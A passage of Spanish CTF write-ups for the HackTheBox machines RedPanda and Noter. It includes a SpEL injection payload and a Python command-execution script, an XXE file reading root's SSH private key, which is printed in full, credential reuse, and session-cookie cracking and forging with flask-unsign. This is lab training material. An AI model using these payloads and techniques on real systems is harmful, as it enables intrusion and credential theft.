práctico, pero al ejecutarlo nos muestra dos caracteres (@*), los cuales devuelven en la respuesta el número 49. Teniendo dos caracteres para probar código, es cuando podemos buscar un payload bien diseñado para ejecutar comandos. En este caso he usado este payload del recurso AllTheThings: ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}Para usar el anterior payload, debemos cambiar el caracter $ por alguno de los otros caracteres obtenidos anteriormente. Cuando probamos a usar el caracter @, no observamos nada, pero al usar el caracter *, obtenemos:Obteniendo una shell como el usuario woodenkAhora podemos pensar que hacer el proceso del payload anterior para ejecutar comandos puede ser una tarea repetitiva y extenuante. Será mejor hacer un script que nos ayude a convertir cada caracter de una cadena en un número basándonos en el payload anterior. En mi caso hice un script en python:from bs4 import BeautifulSoupimport sysimport signalimport requests#variables globalesIP = \"10.10.11.170\"PORT = \"8080\"URL = f\"http://{IP}:{PORT}/search\"data = {\"name\":\"\"}def def_handler(sig,frame): print(\"Exit...\") sys.exit(0)signal.signal(signal.SIGINT, def_handler)def makePayload(command): payload = \"*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character)\" characters = [ord(char) for char in command] for i in range(len(characters)): if i == 0: payload += f\".toString({characters[0]})\" else: payload += f\".concat(T(java.lang.Character).toString({characters[i]}))\" payload += \").getInputStream())}\" data[\"name\"] = payloaddef makeRequest(url,data): r = requests.post(url, data=data) soup = BeautifulSoup(r.text,\"html.parser\") try: content = soup.find_all(\"h2\")[0].text return content.replace(\"You searched for: \",\"\").strip() except Exception: return \"N/A\"def main(): while True: makePayload(input(\"&gt; \")) print(makeRequest(URL, data))if __name__ == \"__main__\": main()Estamos ejecutando comandos como el usuario woodenk. El anterior script simula una terminal, pero tiene muchas limitaciones, no podemos entablarnos una revershell funcional por el momento. Haciendo enumeración básica y viendo los procesos, nos encontramos con lo siguiente:&gt; ps -auxUSER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMANDroot 463 0.0 0.7 68512 15140 ? S&lt;s 05:24 0:04 /lib/systemd/systemd-journaldroot 481 0.0 0.0 0 0 ? I&lt; 05:24 0:00 [ipmi-msghandler]root 491 0.0 0.3 22632 6200 ? Ss 05:24 0:01 /lib/systemd/systemd-udevdroot 612 0.0 0.0 0 0 ? I&lt; 05:24 0:00 [kaluad]root 613 0.0 0.0 0 0 ? I&lt; 05:24 0:00 [kmpath_rdacd]root 614 0.0 0.0 0 0 ? I&lt; 05:24 0:00 [kmpathd]root 615 0.0 0.0 0 0 ? I&lt; 05:24 0:00 [kmpath_handlerd]root 616 0.0 0.8 214596 17944 ? SLsl 05:24 0:07 /sbin/multipathd -d -ssystemd+ 642 0.0 0.3 90872 6124 ? Ssl 05:24 0:06 /lib/systemd/systemd-timesyncdroot 654 0.0 0.5 47540 10728 ? Ss 05:24 0:00 /usr/bin/VGAuthServiceroot 659 0.1 0.4 311504 8168 ? Ssl 05:24 1:07 /usr/bin/vmtoolsdroot 671 0.0 0.2 99896 5860 ? Ssl 05:24 0:00 /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -root 689 0.0 0.4 239292 9204 ? Ssl 05:24 0:01 /usr/lib/accountsservice/accounts-daemonmessage+ 690 0.0 0.2 7600 4640 ? Ss 05:24 0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --sroot 699 0.0 0.1 81956 3720 ? Ssl 05:24 0:03 /usr/sbin/irqbalance --foregroundroot 702 0.0 0.4 236436 8952 ? Ssl 05:24 0:00 /usr/lib/policykit-1/polkitd --no-debugsyslog 705 0.0 0.2 224344 5060 ? Ssl 05:24 0:00 /usr/sbin/rsyslogd -n -iNONEroot 708 0.0 0.3 17344 7852 ? Ss 05:24 0:00 /lib/systemd/systemd-logindroot 709 0.0 0.6 395388 13728 ? Ssl 05:24 0:00 /usr/lib/udisks2/udisksdroot 730 0.0 0.6 318820 13472 ? Ssl 05:25 0:00 /usr/sbin/ModemManagerroot 875 0.0 0.1 6812 2964 ? Ss 05:25 0:00 /usr/sbin/cron -froot 876 0.0 0.1 8356 3256 ? S 05:25 0:00 /usr/sbin/CRON -fdaemon 879 0.0 0.1 3792 2156 ? Ss 05:25 0:00 /usr/sbin/atd -froot 880 0.0 0.0 2608 600 ? Ss 05:25 0:00 /bin/sh -c sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jarroot 881 0.0 0.2 9416 4448 ? S 05:25 0:00 sudo -u woodenk -g logs java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jarwoodenk 890 0.8 20.8 3122648 423564 ? Sl 05:25 9:07 java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jarroot 895 0.0 0.3 12172 7384 ? Ss 05:25 0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startupsroot 901 0.0 0.0 5828 1700 tty1 Ss+ 05:25 0:00 /sbin/agetty -o -p -- \\u --noclear tty1 linuxmysql 916 0.2 21.6 1806728 440248 ? Ssl 05:25 2:27 /usr/sbin/mysqldsystemd+ 1110 0.0 0.6 24696 13156 ? Ss 05:31 0:11 /lib/systemd/systemd-resolvedwoodenk 14518 0.0 0.0 81504 1088 ? Ss 13:45 0:00 gpg-agent --homedir /home/woodenk/.gnupg --use-standard-socket --daemonroot 27752 0.0 0.0 0 0 ? I 18:52 0:02 [kworker/1:2-events]root 30652 0.0 0.0 0 0 ? I 22:20 0:03 [kworker/0:0-events]root 31175 0.0 0.0 0 0 ? I 22:55 0:00 [kworker/0:1-events]root 31177 0.0 0.0 0 0 ? I 22:55 0:00 [kworker/1:1]root 31276 0.0 0.0 0 0 ? I 23:02 0:00 [kworker/u4:1-events_power_efficient]root 31587 0.0 0.0 0 0 ? I 23:25 0:00 [kworker/u4:0-events_unbound]root 31751 0.0 0.4 13956 8924 ? Ss 23:37 0:00 sshd: woodenk [priv]woodenk 31784 0.0 0.4 19004 9500 ? Ss 23:38 0:00 /lib/systemd/systemd --userroot 31785 0.0 0.0 0 0 ? I 23:38 0:00 [kworker/0:2-mpt_poll_0]woodenk 31786 0.0 0.1 105584 3208 ? S 23:38 0:00 (sd-pam)root 31787 0.0 0.0 0 0 ? I 23:38 0:00 [kworker/0:3-memcg_kmem_cache]woodenk 31891 0.0 0.2 13956 6020 ? S 23:38 0:00 sshd: woodenk@pts/0woodenk 31892 0.0 0.2 8308 4952 pts/0 Ss 23:38 0:00 -bashwoodenk 31936 0.0 0.1 9080 3568 pts/0 R+ 23:40 0:00 ps -auxVemos un proceso interesante, el cual tiene el PID 880, vemos que el usuario root está ejecutando como el usuario woodenk lo siguiente:java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar`Ahora, recordemos nuevamente que se está empleando Spring Boot, así que debe tener una estructura como cualquier proyecto. He encontrado este artículo donde nos muestran una estructura que se puede emplear en algunos proyectos. Podemos ver archivos controladores o controller. A veces podemos encontrar credenciales en esos lugares. Vamos a revisar la ruta /opt/panda_search:&gt; ls -la /opt/panda_search/src/main/java/com/panda_search/htb/panda_searchtotal 24drwxrwxr-x 2 root root 4096 Jun 21 12:24 .drwxrwxr-x 3 root root 4096 Jun 14 14:35 ..-rw-rw-r-- 1 root root 4321 Jun 20 13:02 MainController.java-rw-rw-r-- 1 root root 779 Feb 21 18:04 PandaSearchApplication.java-rw-rw-r-- 1 root root 1800 Jun 14 14:09 RequestInterceptor.javaTuve que profundizar en las rutas pero aquí terminan los directorios para este lugar, revisemos entonces el controlador:import java.util.ArrayList;import java.io.IOException;import java.sql.*;import java.util.List;import java.util.ArrayList;import java.io.File;import java.io.InputStream;import java.io.FileInputStream;import org.springframework.stereotype.Controller;import org.springframework.ui.Model;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.PostMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.bind.annotation.RestController;import org.springframework.web.bind.annotation.ResponseBody;import org.springframework.web.servlet.ModelAndView;import org.springframework.http.MediaType;import org.apache.commons.io.IOUtils;import org.jdom2.JDOMException;import org.jdom2.input.SAXBuilder;import org.jdom2.output.Format;import org.jdom2.output.XMLOutputter;import org.jdom2.*;@Controllerpublic class MainController { @GetMapping(\"/stats\") public ModelAndView stats(@RequestParam(name=\"author\",required=false) String author, Model model) throws JDOMException, IOException { SAXBuilder saxBuilder = new SAXBuilder(); if(author == null) author = \"N/A\"; author = author.strip(); System.out.println('\"' + author + '\"'); if(author.equals(\"woodenk\") || author.equals(\"damian\")) { String path = \"/credits/\" + author + \"_creds.xml\"; File fd = new File(path); Document doc = saxBuilder.build(fd); Element rootElement = doc.getRootElement(); String totalviews = rootElement.getChildText(\"totalviews\"); List&lt;Element&gt; images = rootElement.getChildren(\"image\"); for(Element image: images) System.out.println(image.getChildText(\"uri\")); model.addAttribute(\"noAuthor\", false); model.addAttribute(\"author\", author); model.addAttribute(\"totalviews\", totalviews); model.addAttribute(\"images\", images); return new ModelAndView(\"stats.html\"); } else { model.addAttribute(\"noAuthor\", true); return new ModelAndView(\"stats.html\"); } } @GetMapping(value=\"/export.xml\", produces = MediaType.APPLICATION_OCTET_STREAM_VALUE) public @ResponseBody byte[] exportXML(@RequestParam(name=\"author\", defaultValue=\"err\") String author) throws IOException { System.out.println(\"Exporting xml of: \" + author); if(author.equals(\"woodenk\") || author.equals(\"damian\")) { InputStream in = new FileInputStream(\"/credits/\" + author + \"_creds.xml\"); System.out.println(in); return IOUtils.toByteArray(in); } else { return IOUtils.toByteArray(\"Error, incorrect paramenter 'author'\\n\\r\"); } } @PostMapping(\"/search\") public ModelAndView search(@RequestParam(\"name\") String name, Model model) { if(name.isEmpty()) { name = \"Greg\"; } String query = filter(name); ArrayList pandas = searchPanda(query); System.out.println(\"\\n\\\"\"+query+\"\\\"\\n\"); model.addAttribute(\"query\", query); model.addAttribute(\"pandas\", pandas); model.addAttribute(\"n\", pandas.size()); return new ModelAndView(\"search.html\"); } public String filter(String arg) { String[] no_no_words = {\"%\", \"_\",\"$\", \"~\", }; for (String word : no_no_words) { if(arg.contains(word)){ return \"Error occured: banned characters\"; } } return arg; } public ArrayList searchPanda(String query) { Connection conn = null; PreparedStatement stmt = null; ArrayList&lt;ArrayList&gt; pandas = new ArrayList(); try { Class.forName(\"com.mysql.cj.jdbc.Driver\"); conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/red_panda\", \"woodenk\", \"RedPandazRule\"); stmt = conn.prepareStatement(\"SELECT name, bio, imgloc, author FROM pandas WHERE name LIKE ?\"); stmt.setString(1, \"%\" + query + \"%\"); ResultSet rs = stmt.executeQuery(); while(rs.next()) { ArrayList&lt;String&gt; panda = new ArrayList&lt;String&gt;(); panda.add(rs.getString(\"name\")); panda.add(rs.getString(\"bio\")); panda.add(rs.getString(\"imgloc\")); panda.add(rs.getString(\"author\")); pandas.add(panda); } } catch(Exception e){ System.out.println(e); } return pandas; }}Vemos un método filter el cual nos impedía escribir esos 4 caracteres que están en el arreglo no_no_words, pero lo más importante es que tenemos credenciales con el usuario woodenk:conn = DriverManager.getConnection(\"jdbc:mysql://localhost:3306/red_panda\", \"woodenk\", \"RedPandazRule\");—¿Qué tal si se están reutilizando?— Intentemos conectarnos a través de SSH:❯ ssh woodenk@10.10.11.170woodenk@10.10.11.170\\'s password: RedPandazRule¡Ganamos acceso con una shell funcional!Escalando privilegiosAnalizando procesos con pspyHaciendo un reconocimiento básico, no encontramos nada de lo que nos podamos aprovechar, así que he optado por usar pspy para analizar procesos. Entre los más relevantes encontramos:CMD: UID=0 PID=2040 | /bin/sh -c sudo -u woodenk /opt/cleanup.shCMD: UID=1000 PID=2051 | /bin/bash /opt/cleanup.sh CMD: UID=1000 PID=2052 | /usr/bin/find /tmp -name *.xml -exec rm -rf {} ; CMD: UID=1000 PID=2053 | /usr/bin/find /var/tmp -name *.xml -exec rm -rf {} ; CMD: UID=1000 PID=2054 | /usr/bin/find /dev/shm -name *.xml -exec rm -rf {} ; CMD: UID=1000 PID=2055 | /usr/bin/find /home/woodenk -name *.xml -exec rm -rf {} ;CMD: UID=1000 PID=2058 | /usr/bin/find /tmp -name *.jpg -exec rm -rf {} ; CMD: UID=1000 PID=2049 | /usr/bin/find /var/tmp -name *.jpg -exec rm -rf {} ; CMD: UID=1000 PID=2050 | /usr/bin/find /home/woodenk -name *.jpg -exec rm -rf {} ;root está ejecutando un script como el usuario woodenk y vemos lo que hace el script —también podríamos verlo directamente con cat—. Además, se están eliminando archivos con extensión.jpg y .xml.Analizando código en Java y explotando un XXEAnteriormente hemos visto que el usuario root está ejecutando el compilado del proyecto java -jar /opt/panda_search/target/panda_search-0.0.1-SNAPSHOT.jar, —también aparece en lo que nos reporta pspy—. Revisando un poco la ruta /opt/ tambíen encontramos un directorio llamado logParser, el cual contiene un archivo interesante: parece de la applicación web.Revisando un poco el código, vemos que se está escribiendo un archivo xml, —seguro es para exportarlo—. Además del código anterior, también hemos encontrado un archivo de logs:woodenk@redpanda:/opt/panda_search$ cat redpanda.log200||10.10.14.133||Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0||/stats200||10.10.14.133||Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0||/stats200||10.10.14.133||Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0||/stats200||10.10.16.13||Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36||/search200||10.10.14.133||Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0||/stats200||10.10.16.13||Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Safari/537.36||/search200||10.10.14.133||Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0||/statsRealicemos una petición:❯ curl http://10.10.11.170:8080/Si volvemos a revisar el archivo de logs, nos aprece la petición:200||10.10.16.18||curl/7.84.0||/En el código Java encontrado, podemos visualizar cómo se está parseando la información. Además vemos que lee los logs y realiza ciertas acciones. Si tenemos el control del input en esta parte, podríamos inyectar código. Comentaré el código según los parámetros que enviaré para una mejor comprensión. Recordemos que todas las aplicaciones Java comienzan ejecutando la función main:woodenk@redpanda:/opt/credit-score/LogParser/final/src/main/java/com/logparser$ cat App.java package com.logparser;import java.io.BufferedWriter;import java.io.File;import java.io.FileWriter;import java.io.IOException;import java.util.HashMap;import java.util.Map;import java.util.Scanner;import com.drew.imaging.jpeg.JpegMetadataReader;import com.drew.imaging.jpeg.JpegProcessingException;import com.drew.metadata.Directory;import com.drew.metadata.Metadata;import com.drew.metadata.Tag;import org.jdom2.JDOMException;import org.jdom2.input.SAXBuilder;import org.jdom2.output.Format;import org.jdom2.output.XMLOutputter;import org.jdom2.*;public class App { public static Map parseLog(String line) { // line = 200||10.10.16.18||||/../../../../../../home/woodenk/linux.jpg||/ // strings = [200, 10.10.16.18, \"\", /../../../../../../home/woodenk/linux.jpg, \"\"] String[] strings = line.split(\"\\\\|\\\\|\"); Map map = new HashMap&lt;&gt;(); // \"status_code\" : \"200\" map.put(\"status_code\", Integer.parseInt(strings[0])); // \"ip\" : \"10.10.16.18\" map.put(\"ip\", strings[1]); // \"user_agent\" : \"\" map.put(\"user_agent\", strings[2]); // \"uri\" : \"/../../../../../../home/woodenk/linux.jpg\" map.put(\"uri\", strings[3]); return map; } public static boolean isImage(String filename){ // filename = 200||10.10.16.18||||/../../../../../../home/woodenk/linux.jpg||/ if(filename.contains(\".jpg\")){ return true; } return false; } public static String getArtist(String uri) throws IOException, JpegProcessingException{ // uri = /../../../../../../home/woodenk/linux.jpg // fullpath = /opt/panda_search/src/main/resources/static/../../../../../../home/woodenk/linux.jpg String fullpath = \"/opt/panda_search/src/main/resources/static\" + uri; // Lee el archivo de la variable fullpath, pero hemos hecho un 'path-traversal' // así que el path que está leyendo la variable jpgFile sería: // fullpath = /home/woodenk/linux.jpg File jpgFile = new File(fullpath); Metadata metadata = JpegMetadataReader.readMetadata(jpgFile); for(Directory dir : metadata.getDirectories()) { for(Tag tag : dir.getTags()){ // Para este punto ya debimos haber subido una imagen con // un tag en la metadata llamada 'Artist' // para este caso, el valor de este tag debería ser // el nombre de nuestro archivo que se leerá para // interpretar el código y explotar el XXE // el valor que he puesto como metada ha sido: ../home/woodenk/new if(tag.getTagName() == \"Artist\") { // ../home/woodenk/new return tag.getDescription(); } } } return \"N/A\"; } public static void addViewTo(String path, String uri) throws JDOMException, IOException{ // path = \"/credits/../home/woodenks/new_creds.xml\" // uri = \"/../../../../../../home/woodenk/linux.jpg\" SAXBuilder saxBuilder = new SAXBuilder(); XMLOutputter xmlOutput = new XMLOutputter(); xmlOutput.setFormat(Format.getPrettyFormat()); // Por el path traversal aplicado el archivo que estaremos leyendo es: // path = \"/home/woodenk/new_creds.xml\" // Para este punto ya hemos subido nuestro archivo XML malicioso File fd = new File(path); // Lee la estructura del XML Document doc = saxBuilder.build(fd); Element rootElement = doc.getRootElement(); for(Element el: rootElement.getChildren()) { // En nuestro archivo XML debimos haber puesto una estructura con // la etiqueta &lt;image&gt; para llegar hasta aquí if(el.getName() == \"image\") { // ... y dentro de la etiqueta &lt;image&gt; una etiqueta &lt;uri&gt; // comprobación: \"\"/../../../../../../home/woodenk/linux.jpg\"? True if(el.getChild(\"uri\").getText().equals(uri)){ // Esto de aca dentro es poco relevante Integer totalviews = Integer.parseInt(rootElement.getChild(\"totalviews\").getText()) + 1; System.out.println(\"Total views:\" + Integer.toString(totalviews)); rootElement.getChild(\"totalviews\").setText(Integer.toString(totalviews)); Integer views = Integer.parseInt(el.getChild(\"views\").getText()); el.getChild(\"views\").setText(Integer.toString(views + 1)); } } } // Llegados a este punto podemos obtener la ejecución de un comando // gracias al XML y lo que hayamos puesto BufferedWriter writer = new BufferedWriter(new FileWriter(fd)); // File fd = new File(path); doc = saxBuilder.build(fd); // ¡Ya se ha ejecutado el comando puesto en la entidad del XML malicioso // y hemos obtenido credenciales como root! xmlOutput.output(doc, writer); } public static void main(String[] args) throws JDOMException, IOException, JpegProcessingException { //Aquí se leen los logs File log_fd = new File(\"/opt/panda_search/redpanda.log\"); Scanner log_reader = new Scanner(log_fd); while(log_reader.hasNextLine()){ // line = 200||10.10.16.18||||/../../../../../../home/woodenk/linux.jpg||/ String line = log_reader.nextLine(); if(!isImage(line)){ continue; } Map parsed_data = parseLog(line); // parsed_data.get(\"uri\") = /../../../../../../home/woodenk/linux.jpg System.out.println(parsed_data.get(\"uri\")); // artist = \"\"../home/woodenk/new\" String artist = getArtist(parsed_data.get(\"uri\").toString()); // Artist: ../home/woodenk/new System.out.println(\"Artist: \" + artist); // El path donde residirá el código el cual queremos que sea // interpretado // xmlPath = \"/credits/../home/woodenk/new_creds.xml\" String xmlPath = \"/credits/\" + artist + \"_creds.xml\"; addViewTo(xmlPath, parsed_data.get(\"uri\").toString()); } }}Procedamos a decargar cualquier imagen en nuestro equipo y agregar el tag “Artist” a la metadata:❯ exiftool -Artist=\"/../../../../../../home/woodenk/linux.jpg\"Y ahora creamos el archivo XML malicioso:&lt;!--?xml version=\"1.0\" ?--&gt;&lt;!DOCTYPE replace [&lt;!ENTITY key SYSTEM \"file:///root/.ssh/id_rsa\"&gt; ]&gt;&lt;credits&gt; &lt;author&gt;damian&lt;/author&gt; &lt;image&gt; &lt;uri&gt;/../../../../../../home/woodenk/linux.jpg&lt;/uri&gt; &lt;privesc&gt;&amp;key;&lt;/privesc&gt; &lt;views&gt;0&lt;/views&gt; &lt;/image&gt; &lt;totalviews&gt;0&lt;/totalviews&gt;&lt;/credits&gt;Ambos archivos los transferimos a la máquina víctima. Ambos archivos los movemos al directorio home de woodenk. Ahora simplemente realizamos una petición desde nuestro equipo:curl http://10.10.11.170 -H 'User-Agent: ||/../../../../../../home/woodenk/linux.jpg'Ahora, verifiquemos cambios en el archivo:woodenk@redpanda: watch -n0 cat new_creds.xmlDespués de un tiempo, nos aparece lo siguiente:&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;!DOCTYPE replace [ &lt;!ENTITY xxe SYSTEM \"file:///root/.ssh/id_rsa\" &gt;]&gt;&lt;credits&gt; &lt;author&gt;woodenk&lt;/author&gt; &lt;image&gt; &lt;uri&gt;/../../../../../../../../home/woodenk/linux.jpg&lt;/uri&gt; &lt;priv&gt;-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJRwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=-----END OPENSSH PRIVATE KEY-----&lt;/priv&gt; &lt;views&gt;0&lt;/views&gt; &lt;/image&gt; &lt;totalviews&gt;0&lt;/totalviews&gt;&lt;/credits&gt;Tenemos la id_rsa del usuario root. La guardamos en un archivo, le damos permisos 600 y procedemos a conectarnos como este usuario:❯ chmod 600 id_rsa❯ ssh -i id_rsa root@10.10.11.170¡Happy Hacking!" }, { "title": "WriteUp Noter HTB", "url": "/posts/WriteUp-Noter-HTB/", "categories": "HackTheBox, WriteUp, Machines, Linux", "tags": "ftp, flask-unsing, JWT, CVE-2021-23639, UDF library", "date": "2022-09-02 00:00:00 -0500", "snippet": "Índice Información básica de la máquina Herramientas y recursos empleados Fase de enumeración Enumerando usuarios ¿Tienes algún secreto? Accediendo a ftp como blue Accediendo a ftp como ftp_admin ¿Hay algo o alguien aquí? Escalando privilegios Máquina Noter IP 10.10.11.160 OS Linux Dificultad Media Creador kavigihan Herramientas y recursos empleados Herramientas nmap wfuzz flask-unsign ftp netcat Recursos hacktricks SecLists Fase de enumeraciónIniciamos con un escaneo de todos los puertos abiertos y la detección de servicios para los mismos:❯ nmap -sCV -oN scope.txt 10.10.11.160Nmap scan report for 10.10.11.160Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)| 256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)|_ 256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)5000/tcp open http Werkzeug httpd 2.0.2 (Python 3.8.10)|_http-title: NoterService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Tenemos el puerto 21 (ftp), 22 (SSH) y 5000 (http), al parecer usando python con Werkzeug.Intentemos conectarnos a través de ftp como anonymous con una contraseña vacía:❯ ftp 10.10.11.160Connected to 10.10.11.160.220 (vsFTPd 3.0.3)Name (10.10.11.160:$(USER)): anonymous331 Please specify the password.Password: 530 Login incorrect.ftp: Login failed.No podemos acceder, necesitamos credenciales. Tampoco tenemos credenciales para conectarnos por SSH, así que de momento lo dejamos y vamos a por el siguiente servicio, el puerto 5000.Vamos a nuestro navegador favorito y ponemos http://10.10.11.160:5000 para realizar la búsqueda. Observamos lo siguiente:Es una web para guardar notas. Podemos intentar credenciales por defecto en Login como: admin:admin administrator:administrator guest:guestSin embargo, ninguna funciona. Así que vamos a registrarnos para tener un poco más de alcance:Bueno, vemos que podemos hacer varias cosas, entre ellas: ver nuestras notas y comprar una membresía VIP. También vemos algo interesante: el usuario con el cual ingresamos, se refleja en el dashboard, por lo que podríamos pensar en SSTI —ya os digo que no sucede nada si hacemos pruebas en el usuario, en el título de las notas ni en el cuerpo de las notas—. Inspeccionando un poco más, nos encontramos algo con lo que podemos jugar: un JWT (Json Web Token) guardado en las cookies de nuestra sesión: eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdDEyMyJ9.YxEeSg.4OIleiyuMjzHlWq0byrDImDLaqUVeamos qué contiene al pasarlo a esta web o también podemos decodear la primer parte del Token desde consola:❯ echo 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdDEyMyJ9' | base64 -d | jq{ \"logged_in\": true, \"username\": \"test123\"} En la web tenemos más datos como el tipo de cifrado HMACSHA256Enumerando usuariosAnteriormente en el intento de acceder usando credenciales por defecto, vimos el mensaje de error Invalid credentials. Cuando usamos el usuario que registramos (test123) con una contraseña errónea, aparece el mensaje Ìnvalid login, así que tenemos una vía potencial de enumerar usuarios. Denodo a lo anterior usaré wfuzz —también podríamos crear un script en python para el mismo fin—:❯ wfuzz -c --ss 'Invalid login' -w /usr/share/SecLists/Usernames/Names/names.txt -d 'username=FUZZ&amp;password=admin' -H 'Content-Type: application/x-www-form-urlencoded' http://10.10.11.160:5000/login********************************************************* Wfuzz 3.1.0 - The Web Fuzzer *********************************************************Target: http://10.10.11.160:5000/loginTotal requests: 10177=====================================================================ID Response Lines Word Chars Payload =====================================================================000001208: 200 68 L 110 W 2027 Ch \"blue\" -c: salida con colores --ss: show regex -w: diccionario -d: datos -H: cabecera¿Tienes algún secreto?El formato de datos lo podemos ver en la petición que mandamos al intentar ingresar con un usuario y contraseña desde el navegador.Lo importante: obtuvimos un usuario, blue ¿Y ahora qué? Bueno, haciendo una búsqueda por internet o más bien en la “Biblia”, hacktricks, nos encontramos con algo que nos puede ayudar a crackear el secreto del JWT:❯ flask-unsign --wordlist /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoidGVzdDEyMyJ9.YxEeSg.4OIleiyuMjzHlWq0byrDImDLaqU' --no-literal-eval[*] Session decodes to: {'logged_in': True, 'username': 'test123'}[*] Starting brute-forcer with 8 threads..[+] Found secret key after 18048 attemptsb'secret123'Ahora que tenemos el secreto secret123, podemos construir nuestro propio JWT para conectarnos con el usuario blue:❯ flask-unsign --sign --cookie \"{'logged_in': True, 'username': 'blue'}\" --secret 'secret123'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YxEq4Q.mqsQtRYlhrqrq2hkn604WPY2PLYCambiamos en el navegador la cookie que teníamos por la que hemos construido y accedemos. Al entrar a la sesión vemos que tiene VIP —con un usuario normal no la teníamos—. Además, observamos que hay dos notas, y una de ellas es ‘Noter Premium Membership’ en la que encontramos lo siguiente: Written by ftp_admin on Mon Dec 20 01:52:32 2021Hello, Thank you for choosing our premium service. Now you are capable ofdoing many more things with our application. All the information you are goingto need are on the Email we sent you. By the way, now you can access our FTPservice as well. Your username is ‘blue’ and the password is ‘blue@Noter!’.Make sure to remember them and delete this.(Additional information are included in the attachments we sent along theEmail)We all hope you enjoy our service. Thanks!ftp_adminAccediendo a ftp como blue¡Ahora tenemos credenciales para acceder por ftp! Cuando accedemos obtenemos lo siguiente:❯ ftp 10.10.11.160 Connected to 10.10.11.160.220 (vsFTPd 3.0.3)Name (10.10.11.160:$(USER)): blue331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls -la200 PORT command successful. Consider using PASV.150 Here comes the directory listing.drwxr-xr-x 3 0 1002 4096 May 02 23:05 .drwxr-xr-x 3 0 1002 4096 May 02 23:05 ..drwxr-xr-x 2 1002 1002 4096 May 02 23:05 files-rw-r--r-- 1 1002 1002 12569 Dec 24 2021 policy.pdfftp&gt; El archivo PDF nos dice la política que se emplea para las contraseñas username@site_name!.Accediendo a ftp como ftp_adminSabiendo lo anterior, podemos intentar acceder como el usuario admin siguiendo la política:❯ ftp 10.10.11.160Connected to 10.10.11.160.220 (vsFTPd 3.0.3)Name (10.10.11.160:rabb1t0xf): ftp_admin331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls -la200 PORT command successful. Consider using PASV.150 Here comes the directory listing.drwxr-xr-x 2 0 1003 4096 May 02 23:05 .drwxr-xr-x 2 0 1003 4096 May 02 23:05 ..-rw-r--r-- 1 1003 1003 25559 Nov 01 2021 app_backup_1635803546.zip-rw-r--r-- 1 1003 1003 26298 Dec 01 2021 app_backup_1638395546.zip226 Directory send OK. contraseña: ftp_admin@Noter!¡Obtuvimos acceso! Además hay dos backups. Sin rechistar los descargamos:ftp&gt; get app_backup_1635803546.zip app1.zip200 PORT command successful. Consider using PASV.150 Opening BINARY mode data connection for app_backup_1635803546.zip (25559 bytes).226 Transfer complete.25559 bytes received in 0,286 seconds (87,3 kbytes/s)ftp&gt; get app_backup_1638395546.zip app2.zip200 PORT command 